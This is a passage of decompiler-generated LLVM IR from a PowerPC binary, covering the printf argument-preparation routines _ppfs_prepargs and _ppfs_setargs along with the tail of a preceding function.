  %v1_1000eaac = inttoptr i32 %v0_1000ea80 to i8*
  %v2_1000eaac = load i8, i8* %v1_1000eaac, align 1
  %v3_1000eaac = zext i8 %v2_1000eaac to i32
  store i32 %v3_1000eaac, i32* %r0.global-to-local, align 4
  %v3_1000eab0 = icmp eq i8 %v2_1000eaac, 0
  br i1 %v3_1000eab0, label %dec_label_pc_1000eabc, label %dec_label_pc_1000ea7c

dec_label_pc_1000eabc:                            ; preds = %dec_label_pc_1000eaac
  %v0_1000eabc = load i32, i32* @r30, align 4
  %v1_1000eabc = load i32, i32* @r31, align 4
  %v2_1000eabc = inttoptr i32 %v1_1000eabc to i32*
  store i32 %v0_1000eabc, i32* %v2_1000eabc, align 4
  br label %dec_label_pc_1000eac4

dec_label_pc_1000eac4:                            ; preds = %dec_label_pc_1000ea90, %dec_label_pc_1000eabc
  %storemerge = phi i32 [ 0, %dec_label_pc_1000eabc ], [ -1, %dec_label_pc_1000ea90 ]
  store i32 %v0_1000ea20, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000eaac, { 1, 2, 0 }
  uselistorder i32 %v0_1000ea80, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000ea68, { 1, 0 }
  uselistorder i32 %v1_1000ea64, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000eac4, { 1, 0 }
  uselistorder label %dec_label_pc_1000eaac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000eaa8, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000ead8 = load i32, i32* @lr, align 4
  %v0_1000eae0 = load i32, i32* @r3, align 4
  store i32 %v0_1000eae0, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000eafc = add i32 %v0_1000eae0, 24
  %v2_1000eafc = inttoptr i32 %v1_1000eafc to i32*
  %v3_1000eafc = load i32, i32* %v2_1000eafc, align 4
  store i32 %v3_1000eafc, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000eafc, 1
  br i1 %tmp4, label %dec_label_pc_1000eb20, label %dec_label_pc_1000eb08

dec_label_pc_1000eb08:                            ; preds = %entry
  %v2_1000eb08 = add i32 %v0_1000eae0, 8
  %v3_1000eb08 = inttoptr i32 %v2_1000eb08 to i32*
  store i32 0, i32* %v3_1000eb08, align 4
  %v0_1000eb0c = load i32, i32* @r30, align 4
  %v1_1000eb0c = load i32, i32* @r3, align 4
  %v2_1000eb0c = add i32 %v1_1000eb0c, 28
  %v3_1000eb0c = inttoptr i32 %v2_1000eb0c to i32*
  store i32 %v0_1000eb0c, i32* %v3_1000eb0c, align 4
  %v0_1000eb10 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eb10 = load i32, i32* @r3, align 4
  %v2_1000eb10 = add i32 %v1_1000eb10, 24
  %v3_1000eb10 = inttoptr i32 %v2_1000eb10 to i32*
  store i32 %v0_1000eb10, i32* %v3_1000eb10, align 4
  %v0_1000eb14 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eb14 = load i32, i32* @r3, align 4
  %v2_1000eb14 = add i32 %v1_1000eb14, 4
  %v3_1000eb14 = inttoptr i32 %v2_1000eb14 to i32*
  store i32 %v0_1000eb14, i32* %v3_1000eb14, align 4
  store i32 268495644, i32* @lr, align 4
  %v0_1000eb18 = call i32 @_ppfs_setargs()
  store i32 %v0_1000eb18, i32* %r3.global-to-local, align 4
  %v0_1000eb1c = load i32, i32* @r30, align 4
  %v1_1000eb1c = load i32, i32* @r31, align 4
  %v2_1000eb1c = add i32 %v1_1000eb1c, 24
  %v3_1000eb1c = inttoptr i32 %v2_1000eb1c to i32*
  store i32 %v0_1000eb1c, i32* %v3_1000eb1c, align 4
  %v0_1000eb30.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000eb20

dec_label_pc_1000eb20:                            ; preds = %entry, %dec_label_pc_1000eb08
  %v0_1000eb30 = phi i32 [ %v0_1000eae0, %entry ], [ %v0_1000eb30.pre, %dec_label_pc_1000eb08 ]
  store i32 %v0_1000ead8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000eb30

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb20, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000eb34 = load i32, i32* @r3, align 4
  %v1_1000eb34 = add i32 %v0_1000eb34, 24
  %v2_1000eb34 = inttoptr i32 %v1_1000eb34 to i32*
  %v3_1000eb34 = load i32, i32* %v2_1000eb34, align 4
  store i32 %v3_1000eb34, i32* %r0.global-to-local, align 4
  %v1_1000eb38 = add i32 %v0_1000eb34, 88
  store i32 %v1_1000eb38, i32* %r8.global-to-local, align 4
  %v1_1000eb3c = add i32 %v0_1000eb34, 8
  %v2_1000eb3c = inttoptr i32 %v1_1000eb3c to i32*
  %v3_1000eb3c = load i32, i32* %v2_1000eb3c, align 4
  store i32 %v3_1000eb3c, i32* %r9.global-to-local, align 4
  %v2_1000eb40 = icmp sgt i32 %v3_1000eb34, 0
  %v3_1000eb40 = icmp eq i32 %v3_1000eb34, 0
  store i1 %v2_1000eb40, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000eb40, label %dec_label_pc_1000eb48, label %dec_label_pc_1000ed34

dec_label_pc_1000eb48:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000eb4c = icmp ne i32 %v3_1000eb3c, -2147483648
  %v4_1000eb4c = icmp eq i32 %v3_1000eb3c, -2147483648
  store i1 %v3_1000eb4c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000eb4c, label %dec_label_pc_1000eb54, label %dec_label_pc_1000eb94

dec_label_pc_1000eb54:                            ; preds = %dec_label_pc_1000eb48
  %v1_1000eb54 = add i32 %v0_1000eb34, 76
  %v2_1000eb54 = inttoptr i32 %v1_1000eb54 to i8*
  %v3_1000eb54 = load i8, i8* %v2_1000eb54, align 1
  %v4_1000eb54 = zext i8 %v3_1000eb54 to i32
  store i32 %v4_1000eb54, i32* %r10.global-to-local, align 4
  store i32 %v1_1000eb54, i32* %r11.global-to-local, align 4
  %v2_1000eb5c = icmp ugt i8 %v3_1000eb54, 8
  store i1 %v2_1000eb5c, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000eb54, 7
  br i1 %tmp, label %dec_label_pc_1000eb7c, label %dec_label_pc_1000eb64

dec_label_pc_1000eb64:                            ; preds = %dec_label_pc_1000eb54
  %v1_1000eb64 = add i32 %v0_1000eb34, 84
  %v2_1000eb64 = inttoptr i32 %v1_1000eb64 to i32*
  %v3_1000eb64 = load i32, i32* %v2_1000eb64, align 4
  %v1_1000eb68 = mul nuw nsw i32 %v4_1000eb54, 4
  %v2_1000eb6c = add i32 %v3_1000eb64, %v1_1000eb68
  store i32 %v2_1000eb6c, i32* %r9.global-to-local, align 4
  %v1_1000eb70 = add nuw nsw i32 %v4_1000eb54, 1
  store i32 %v1_1000eb70, i32* %r0.global-to-local, align 4
  %v1_1000eb74 = trunc i32 %v1_1000eb70 to i8
  store i8 %v1_1000eb74, i8* %v2_1000eb54, align 1
  br label %dec_label_pc_1000eb88

dec_label_pc_1000eb7c:                            ; preds = %dec_label_pc_1000eb54
  %v1_1000eb7c = add i32 %v0_1000eb34, 80
  %v2_1000eb7c = inttoptr i32 %v1_1000eb7c to i32*
  %v3_1000eb7c = load i32, i32* %v2_1000eb7c, align 4
  store i32 %v3_1000eb7c, i32* %r9.global-to-local, align 4
  %v1_1000eb80 = add i32 %v3_1000eb7c, 4
  store i32 %v1_1000eb80, i32* %r0.global-to-local, align 4
  store i32 %v1_1000eb80, i32* %v2_1000eb7c, align 4
  br label %dec_label_pc_1000eb88

dec_label_pc_1000eb88:                            ; preds = %dec_label_pc_1000eb64, %dec_label_pc_1000eb7c
  %v0_1000eb88 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000eb88 = inttoptr i32 %v0_1000eb88 to i32*
  %v2_1000eb88 = load i32, i32* %v1_1000eb88, align 4
  store i32 %v2_1000eb88, i32* %r0.global-to-local, align 4
  %v1_1000eb8c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000eb8c = inttoptr i32 %v1_1000eb8c to i32*
  store i32 %v2_1000eb88, i32* %v2_1000eb8c, align 4
  %v0_1000eb90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eb90 = load i32, i32* @r3, align 4
  %v2_1000eb90 = add i32 %v1_1000eb90, 8
  %v3_1000eb90 = inttoptr i32 %v2_1000eb90 to i32*
  store i32 %v0_1000eb90, i32* %v3_1000eb90, align 4
  %v0_1000eb94.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000eb94

dec_label_pc_1000eb94:                            ; preds = %dec_label_pc_1000eb48, %dec_label_pc_1000eb88
  %v2_1000ebc4 = phi i32 [ %v0_1000eb34, %dec_label_pc_1000eb48 ], [ %v0_1000eb94.pre, %dec_label_pc_1000eb88 ]
  %v1_1000eb94 = add i32 %v2_1000ebc4, 4
  %v2_1000eb94 = inttoptr i32 %v1_1000eb94 to i32*
  %v3_1000eb94 = load i32, i32* %v2_1000eb94, align 4
  store i32 %v3_1000eb94, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000eb9c = icmp ne i32 %v3_1000eb94, -2147483648
  %v4_1000eb9c = icmp eq i32 %v3_1000eb94, -2147483648
  store i1 %v3_1000eb9c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000eb9c, label %dec_label_pc_1000eba4, label %dec_label_pc_1000ed24.preheader

dec_label_pc_1000eba4:                            ; preds = %dec_label_pc_1000eb94
  %v1_1000eba4 = add i32 %v2_1000ebc4, 76
  %v2_1000eba4 = inttoptr i32 %v1_1000eba4 to i8*
  %v3_1000eba4 = load i8, i8* %v2_1000eba4, align 1
  %v4_1000eba4 = zext i8 %v3_1000eba4 to i32
  store i32 %v4_1000eba4, i32* %r10.global-to-local, align 4
  store i32 %v1_1000eba4, i32* %r11.global-to-local, align 4
  %v2_1000ebac = icmp ugt i8 %v3_1000eba4, 8
  store i1 %v2_1000ebac, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000eba4, 7
  br i1 %tmp22, label %dec_label_pc_1000ebcc, label %dec_label_pc_1000ebb4

dec_label_pc_1000ebb4:                            ; preds = %dec_label_pc_1000eba4
  %v1_1000ebb4 = add i32 %v2_1000ebc4, 84
  %v2_1000ebb4 = inttoptr i32 %v1_1000ebb4 to i32*
  %v3_1000ebb4 = load i32, i32* %v2_1000ebb4, align 4
  %v1_1000ebb8 = mul nuw nsw i32 %v4_1000eba4, 4
  %v2_1000ebbc = add i32 %v3_1000ebb4, %v1_1000ebb8
  store i32 %v2_1000ebbc, i32* %r9.global-to-local, align 4
  %v1_1000ebc0 = add nuw nsw i32 %v4_1000eba4, 1
  store i32 %v1_1000ebc0, i32* %r0.global-to-local, align 4
  %v1_1000ebc4 = trunc i32 %v1_1000ebc0 to i8
  store i8 %v1_1000ebc4, i8* %v2_1000eba4, align 1
  br label %dec_label_pc_1000ebd8

dec_label_pc_1000ebcc:                            ; preds = %dec_label_pc_1000eba4
  %v1_1000ebcc = add i32 %v2_1000ebc4, 80
  %v2_1000ebcc = inttoptr i32 %v1_1000ebcc to i32*
  %v3_1000ebcc = load i32, i32* %v2_1000ebcc, align 4
  store i32 %v3_1000ebcc, i32* %r9.global-to-local, align 4
  %v1_1000ebd0 = add i32 %v3_1000ebcc, 4
  store i32 %v1_1000ebd0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ebd0, i32* %v2_1000ebcc, align 4
  br label %dec_label_pc_1000ebd8

dec_label_pc_1000ebd8:                            ; preds = %dec_label_pc_1000ebb4, %dec_label_pc_1000ebcc
  %v0_1000ebd8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ebd8 = inttoptr i32 %v0_1000ebd8 to i32*
  %v2_1000ebd8 = load i32, i32* %v1_1000ebd8, align 4
  store i32 %v2_1000ebd8, i32* %r0.global-to-local, align 4
  %v1_1000ebdc = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ebdc = inttoptr i32 %v1_1000ebdc to i32*
  store i32 %v2_1000ebd8, i32* %v2_1000ebdc, align 4
  %v0_1000ebe0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ebe0 = load i32, i32* @r3, align 4
  %v2_1000ebe0 = add i32 %v1_1000ebe0, 4
  %v3_1000ebe0 = inttoptr i32 %v2_1000ebe0 to i32*
  store i32 %v0_1000ebe0, i32* %v3_1000ebe0, align 4
  %v0_1000ed245.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ed24.preheader

dec_label_pc_1000ed24.preheader:                  ; preds = %dec_label_pc_1000eb94, %dec_label_pc_1000ebd8
  %v0_1000ed245 = phi i32 [ %v2_1000ebc4, %dec_label_pc_1000eb94 ], [ %v0_1000ed245.pre, %dec_label_pc_1000ebd8 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000ed246 = add i32 %v0_1000ed245, 28
  %v2_1000ed247 = inttoptr i32 %v1_1000ed246 to i32*
  %v3_1000ed248 = load i32, i32* %v2_1000ed247, align 4
  store i32 %v3_1000ed248, i32* %r0.global-to-local, align 4
  %v2_1000ed289 = icmp sgt i32 %v3_1000ed248, 0
  %v3_1000ed2810 = icmp slt i32 %v3_1000ed248, 0
  store i1 %v3_1000ed2810, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000ed289, label %dec_label_pc_1000ebec, label %dec_label_pc_1000ed74

dec_label_pc_1000ebec:                            ; preds = %dec_label_pc_1000ed24.preheader, %dec_label_pc_1000ed20
  %v2_1000ed00 = phi i32 [ %v0_1000ed24, %dec_label_pc_1000ed20 ], [ %v0_1000ed245, %dec_label_pc_1000ed24.preheader ]
  %v0_1000ebec = phi i32 [ %v1_1000ed20, %dec_label_pc_1000ed20 ], [ 0, %dec_label_pc_1000ed24.preheader ]
  %v1_1000ebec = mul i32 %v0_1000ebec, 4
  %v2_1000ebf0 = add i32 %v1_1000ebec, %v2_1000ed00
  store i32 %v2_1000ebf0, i32* %r9.global-to-local, align 4
  %v1_1000ebf4 = add i32 %v2_1000ebf0, 40
  %v2_1000ebf4 = inttoptr i32 %v1_1000ebf4 to i32*
  %v3_1000ebf4 = load i32, i32* %v2_1000ebf4, align 4
  store i32 %v3_1000ebf4, i32* %r0.global-to-local, align 4
  %v2_1000ebf8 = icmp sgt i32 %v3_1000ebf4, 8
  %v3_1000ebf8 = icmp eq i32 %v3_1000ebf4, 8
  store i1 %v2_1000ebf8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ebf8, label %dec_label_pc_1000ed20, label %dec_label_pc_1000ec00

dec_label_pc_1000ec00:                            ; preds = %dec_label_pc_1000ebec
  %v1_1000ec00 = add i32 %v2_1000ed00, 76
  store i32 %v1_1000ec00, i32* %r10.global-to-local, align 4
  br i1 %v2_1000ebf8, label %dec_label_pc_1000ec1c, label %dec_label_pc_1000ec08

dec_label_pc_1000ec08:                            ; preds = %dec_label_pc_1000ec00
  %v2_1000ec08 = icmp sgt i32 %v3_1000ebf4, 2
  store i1 %v2_1000ec08, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000ebf4, 3
  br i1 %tmp23, label %dec_label_pc_1000ece4, label %dec_label_pc_1000ec34

dec_label_pc_1000ec1c:                            ; preds = %dec_label_pc_1000ec00
  %v2_1000ec1c = icmp sgt i32 %v3_1000ebf4, 1024
  store i1 %v2_1000ec1c, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000ebf4, 1025
  br i1 %tmp24, label %dec_label_pc_1000ece4, label %dec_label_pc_1000ec28

dec_label_pc_1000ec28:                            ; preds = %dec_label_pc_1000ec1c
  %v2_1000ec28 = icmp sgt i32 %v3_1000ebf4, 2048
  %v3_1000ec28 = icmp eq i32 %v3_1000ebf4, 2048
  store i1 %v2_1000ec28, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ec28, label %dec_label_pc_1000ec3c, label %dec_label_pc_1000ec30

dec_label_pc_1000ec30:                            ; preds = %dec_label_pc_1000ec28
  %v2_1000ec30 = icmp sgt i32 %v3_1000ebf4, 2055
  %v3_1000ec30 = icmp eq i32 %v3_1000ebf4, 2055
  store i1 %v2_1000ec30, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ec30, label %dec_label_pc_1000ec98, label %dec_label_pc_1000ece4

dec_label_pc_1000ec34:                            ; preds = %dec_label_pc_1000ec08
  %v3_1000ec14 = icmp eq i32 %v3_1000ebf4, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ec14, label %dec_label_pc_1000ec98, label %dec_label_pc_1000ece4

dec_label_pc_1000ec3c:                            ; preds = %dec_label_pc_1000ec28
  %v2_1000ec3c = inttoptr i32 %v1_1000ec00 to i8*
  %v3_1000ec3c = load i8, i8* %v2_1000ec3c, align 1
  %v4_1000ec3c = zext i8 %v3_1000ec3c to i32
  %v2_1000ec40 = icmp ugt i8 %v3_1000ec3c, 6
  store i1 %v2_1000ec40, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000ec3c, 2
  %v1_1000ec44 = zext i8 %tmp28 to i32
  store i32 %v1_1000ec44, i32* %r9.global-to-local, align 4
  %v2_1000ec48 = add nuw nsw i32 %v1_1000ec44, %v4_1000ec3c
  store i32 %v2_1000ec48, i32* %r0.global-to-local, align 4
  %v1_1000ec4c = trunc i32 %v2_1000ec48 to i8
  store i8 %v1_1000ec4c, i8* %v2_1000ec3c, align 1
  %v0_1000ec50 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000ec50, label %dec_label_pc_1000ec70, label %dec_label_pc_1000ec54

dec_label_pc_1000ec54:                            ; preds = %dec_label_pc_1000ec3c
  %v0_1000ec54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ec54 = urem i32 %v0_1000ec54, 256
  store i32 %v1_1000ec54, i32* %r9.global-to-local, align 4
  %v0_1000ec58 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec58 = add i32 %v0_1000ec58, 8
  %v2_1000ec58 = inttoptr i32 %v1_1000ec58 to i32*
  %v3_1000ec58 = load i32, i32* %v2_1000ec58, align 4
  %v1_1000ec5c = mul nuw nsw i32 %v1_1000ec54, 4
  store i32 %v1_1000ec5c, i32* %r0.global-to-local, align 4
  %v1_1000ec60 = add nuw nsw i32 %v1_1000ec54, 2
  store i32 %v1_1000ec60, i32* %r9.global-to-local, align 4
  %v2_1000ec64 = add i32 %v3_1000ec58, %v1_1000ec5c
  store i32 %v2_1000ec64, i32* %r11.global-to-local, align 4
  %v1_1000ec68 = trunc i32 %v1_1000ec60 to i8
  %v2_1000ec68 = load i32, i32* @r3, align 4
  %v3_1000ec68 = add i32 %v2_1000ec68, 76
  %v4_1000ec68 = inttoptr i32 %v3_1000ec68 to i8*
  store i8 %v1_1000ec68, i8* %v4_1000ec68, align 1
  br label %dec_label_pc_1000ec84

dec_label_pc_1000ec70:                            ; preds = %dec_label_pc_1000ec3c
  %v0_1000ec70 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec70 = add i32 %v0_1000ec70, 4
  %v2_1000ec70 = inttoptr i32 %v1_1000ec70 to i32*
  %v3_1000ec70 = load i32, i32* %v2_1000ec70, align 4
  %v1_1000ec74 = add i32 %v3_1000ec70, 7
  store i32 %v1_1000ec74, i32* %r9.global-to-local, align 4
  %v1_1000ec78 = call i32 @__asm_rlwinm(i32 %v1_1000ec74, i32 0, i32 0, i32 28)
  store i32 %v1_1000ec78, i32* %r11.global-to-local, align 4
  %v1_1000ec7c = add i32 %v1_1000ec78, 8
  store i32 %v1_1000ec7c, i32* %r0.global-to-local, align 4
  %v1_1000ec80 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ec80 = add i32 %v1_1000ec80, 4
  %v3_1000ec80 = inttoptr i32 %v2_1000ec80 to i32*
  store i32 %v1_1000ec7c, i32* %v3_1000ec80, align 4
  br label %dec_label_pc_1000ec84

dec_label_pc_1000ec84:                            ; preds = %dec_label_pc_1000ec54, %dec_label_pc_1000ec70
  %v0_1000ec84 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ec84 = inttoptr i32 %v0_1000ec84 to i32*
  %v2_1000ec84 = load i32, i32* %v1_1000ec84, align 4
  store i32 %v2_1000ec84, i32* %r9.global-to-local, align 4
  %v1_1000ec88 = add i32 %v0_1000ec84, 4
  %v2_1000ec88 = inttoptr i32 %v1_1000ec88 to i32*
  %v3_1000ec88 = load i32, i32* %v2_1000ec88, align 4
  store i32 %v3_1000ec88, i32* %r10.global-to-local, align 4
  %v1_1000ec8c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ec8c = inttoptr i32 %v1_1000ec8c to i32*
  store i32 %v2_1000ec84, i32* %v2_1000ec8c, align 4
  %v0_1000ec90 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec90 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ec90 = add i32 %v1_1000ec90, 4
  %v3_1000ec90 = inttoptr i32 %v2_1000ec90 to i32*
  store i32 %v0_1000ec90, i32* %v3_1000ec90, align 4
  br label %dec_label_pc_1000ed1c

dec_label_pc_1000ec98:                            ; preds = %dec_label_pc_1000ec30, %dec_label_pc_1000ec34
  store i32 %v1_1000ec00, i32* %r10.global-to-local, align 4
  %v1_1000ec9c = add i32 %v2_1000ed00, 77
  %v2_1000ec9c = inttoptr i32 %v1_1000ec9c to i8*
  %v3_1000ec9c = load i8, i8* %v2_1000ec9c, align 1
  %v4_1000ec9c = zext i8 %v3_1000ec9c to i32
  store i32 %v4_1000ec9c, i32* %r11.global-to-local, align 4
  %v2_1000eca0 = icmp ugt i8 %v3_1000ec9c, 8
  store i1 %v2_1000eca0, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000ec9c, 7
  br i1 %tmp25, label %dec_label_pc_1000ecc4, label %dec_label_pc_1000eca8

dec_label_pc_1000eca8:                            ; preds = %dec_label_pc_1000ec98
  %v1_1000eca8 = add i32 %v2_1000ed00, 84
  %v2_1000eca8 = inttoptr i32 %v1_1000eca8 to i32*
  %v3_1000eca8 = load i32, i32* %v2_1000eca8, align 4
  %v1_1000ecac = mul nuw nsw i32 %v4_1000ec9c, 8
  %v1_1000ecb0 = add nuw nsw i32 %v1_1000ecac, 32
  %v2_1000ecb4 = add i32 %v1_1000ecb0, %v3_1000eca8
  store i32 %v2_1000ecb4, i32* %r9.global-to-local, align 4
  %v1_1000ecb8 = add nuw nsw i32 %v4_1000ec9c, 1
  store i32 %v1_1000ecb8, i32* %r0.global-to-local, align 4
  %v1_1000ecbc = trunc i32 %v1_1000ecb8 to i8
  store i8 %v1_1000ecbc, i8* %v2_1000ec9c, align 1
  br label %dec_label_pc_1000ed1c

dec_label_pc_1000ecc4:                            ; preds = %dec_label_pc_1000ec98
  %v1_1000ecc4 = add i32 %v2_1000ed00, 80
  %v2_1000ecc4 = inttoptr i32 %v1_1000ecc4 to i32*
  %v3_1000ecc4 = load i32, i32* %v2_1000ecc4, align 4
  %v1_1000ecc8 = add i32 %v3_1000ecc4, 7
  store i32 %v1_1000ecc8, i32* %r9.global-to-local, align 4
  %v1_1000eccc = call i32 @__asm_rlwinm(i32 %v1_1000ecc8, i32 0, i32 0, i32 28)
  store i32 %v1_1000eccc, i32* %r9.global-to-local, align 4
  %v1_1000ecd0 = add i32 %v1_1000eccc, 8
  store i32 %v1_1000ecd0, i32* %r0.global-to-local, align 4
  %v1_1000ecd4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ecd4 = add i32 %v1_1000ecd4, 4
  %v3_1000ecd4 = inttoptr i32 %v2_1000ecd4 to i32*
  store i32 %v1_1000ecd0, i32* %v3_1000ecd4, align 4
  br label %dec_label_pc_1000ed1c

dec_label_pc_1000ece4:                            ; preds = %dec_label_pc_1000ec30, %dec_label_pc_1000ec34, %dec_label_pc_1000ec1c, %dec_label_pc_1000ec08
  %v2_1000ece4 = inttoptr i32 %v1_1000ec00 to i8*
  %v3_1000ece4 = load i8, i8* %v2_1000ece4, align 1
  %v4_1000ece4 = zext i8 %v3_1000ece4 to i32
  store i32 %v4_1000ece4, i32* %r11.global-to-local, align 4
  %v2_1000ece8 = icmp ugt i8 %v3_1000ece4, 8
  store i1 %v2_1000ece8, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000ece4, 7
  br i1 %tmp26, label %dec_label_pc_1000ed08, label %dec_label_pc_1000ecf0

dec_label_pc_1000ecf0:                            ; preds = %dec_label_pc_1000ece4
  %v1_1000ecf0 = add i32 %v2_1000ed00, 84
  %v2_1000ecf0 = inttoptr i32 %v1_1000ecf0 to i32*
  %v3_1000ecf0 = load i32, i32* %v2_1000ecf0, align 4
  %v1_1000ecf4 = mul nuw nsw i32 %v4_1000ece4, 4
  %v2_1000ecf8 = add i32 %v3_1000ecf0, %v1_1000ecf4
  store i32 %v2_1000ecf8, i32* %r9.global-to-local, align 4
  %v1_1000ecfc = add nuw nsw i32 %v4_1000ece4, 1
  store i32 %v1_1000ecfc, i32* %r0.global-to-local, align 4
  %v1_1000ed00 = trunc i32 %v1_1000ecfc to i8
  store i8 %v1_1000ed00, i8* %v2_1000ece4, align 1
  br label %dec_label_pc_1000ed14

dec_label_pc_1000ed08:                            ; preds = %dec_label_pc_1000ece4
  %v1_1000ed08 = add i32 %v2_1000ed00, 80
  %v2_1000ed08 = inttoptr i32 %v1_1000ed08 to i32*
  %v3_1000ed08 = load i32, i32* %v2_1000ed08, align 4
  store i32 %v3_1000ed08, i32* %r9.global-to-local, align 4
  %v1_1000ed0c = add i32 %v3_1000ed08, 4
  store i32 %v1_1000ed0c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ed0c, i32* %v2_1000ed08, align 4
  br label %dec_label_pc_1000ed14

dec_label_pc_1000ed14:                            ; preds = %dec_label_pc_1000ecf0, %dec_label_pc_1000ed08
  %v0_1000ed14 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ed14 = inttoptr i32 %v0_1000ed14 to i32*
  %v2_1000ed14 = load i32, i32* %v1_1000ed14, align 4
  store i32 %v2_1000ed14, i32* %r0.global-to-local, align 4
  %v1_1000ed18 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ed18 = inttoptr i32 %v1_1000ed18 to i32*
  store i32 %v2_1000ed14, i32* %v2_1000ed18, align 4
  br label %dec_label_pc_1000ed1c

dec_label_pc_1000ed1c:                            ; preds = %dec_label_pc_1000ecc4, %dec_label_pc_1000eca8, %dec_label_pc_1000ec84, %dec_label_pc_1000ed14
  %v0_1000ed1c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ed1c = add i32 %v0_1000ed1c, 8
  store i32 %v1_1000ed1c, i32* %r8.global-to-local, align 4
  %v0_1000ed20.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000ed24.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ed20

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ebec, %dec_label_pc_1000ed1c
  %v0_1000ed24 = phi i32 [ %v2_1000ed00, %dec_label_pc_1000ebec ], [ %v0_1000ed24.pre, %dec_label_pc_1000ed1c ]
  %v0_1000ed20 = phi i32 [ %v0_1000ebec, %dec_label_pc_1000ebec ], [ %v0_1000ed20.pre, %dec_label_pc_1000ed1c ]
  %v1_1000ed20 = add i32 %v0_1000ed20, 1
  store i32 %v1_1000ed20, i32* %r7.global-to-local, align 4
  %v1_1000ed24 = add i32 %v0_1000ed24, 28
  %v2_1000ed24 = inttoptr i32 %v1_1000ed24 to i32*
  %v3_1000ed24 = load i32, i32* %v2_1000ed24, align 4
  store i32 %v3_1000ed24, i32* %r0.global-to-local, align 4
  %v2_1000ed28 = icmp slt i32 %v1_1000ed20, %v3_1000ed24
  %v3_1000ed28 = icmp sgt i32 %v1_1000ed20, %v3_1000ed24
  store i1 %v3_1000ed28, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000ed28, label %dec_label_pc_1000ebec, label %dec_label_pc_1000ed74

dec_label_pc_1000ed34:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000ed38 = icmp ne i32 %v3_1000eb3c, -2147483648
  %v4_1000ed38 = icmp eq i32 %v3_1000eb3c, -2147483648
  store i1 %v3_1000ed38, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000ed38, label %dec_label_pc_1000ed40, label %dec_label_pc_1000ed54

dec_label_pc_1000ed40:                            ; preds = %dec_label_pc_1000ed34
  %v1_1000ed40 = add i32 %v0_1000eb34, 36
  %v2_1000ed40 = inttoptr i32 %v1_1000ed40 to i8*
  %v3_1000ed40 = load i8, i8* %v2_1000ed40, align 1
  %v4_1000ed40 = zext i8 %v3_1000ed40 to i32
  %v1_1000ed44 = mul nuw nsw i32 %v4_1000ed40, 8
